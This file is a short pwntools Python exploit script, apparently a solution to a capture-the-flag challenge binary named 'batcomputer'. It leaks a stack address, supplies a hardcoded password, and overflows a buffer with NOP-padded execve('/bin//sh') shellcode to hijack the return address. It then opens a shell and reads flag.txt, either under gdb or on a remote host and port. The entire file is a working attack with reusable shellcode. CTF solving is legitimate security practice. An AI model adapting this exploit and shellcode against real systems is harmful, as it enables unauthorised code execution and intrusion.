#!/usr/bin/env python3 


from pwn import *
context.arch = "amd64"

def exploit(io):
    password = b"b4tp@$$w0rd!"
    
    io.sendlineafter(b"> ", b"1")
    io.recvuntil(b"locate him: ")
    buffer_leak = int(io.recvline().strip(), 16)
    
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"password: ", password)    
    
    shellcode = asm("""
                    xor rsi, rsi
                    push rsi
                    movabs rdi, 0x68732f2f6e69622f
                    push rdi
                    mov rdi, rsp
                    mov rax, 59
                    xor rdx, rdx
                    syscall
    """)
    
    payload = shellcode.ljust(84, b"\x90") + p64(buffer_leak)
    io.sendlineafter(b"commands: ", payload) 
    io.sendlineafter(b"> ", b"3")
    io.recv()
    io.sendline(b"cat flag.txt")
    print(io.recv().decode())


def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./batcomputer")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    exploit(io)

if __name__ == "__main__":
    main()
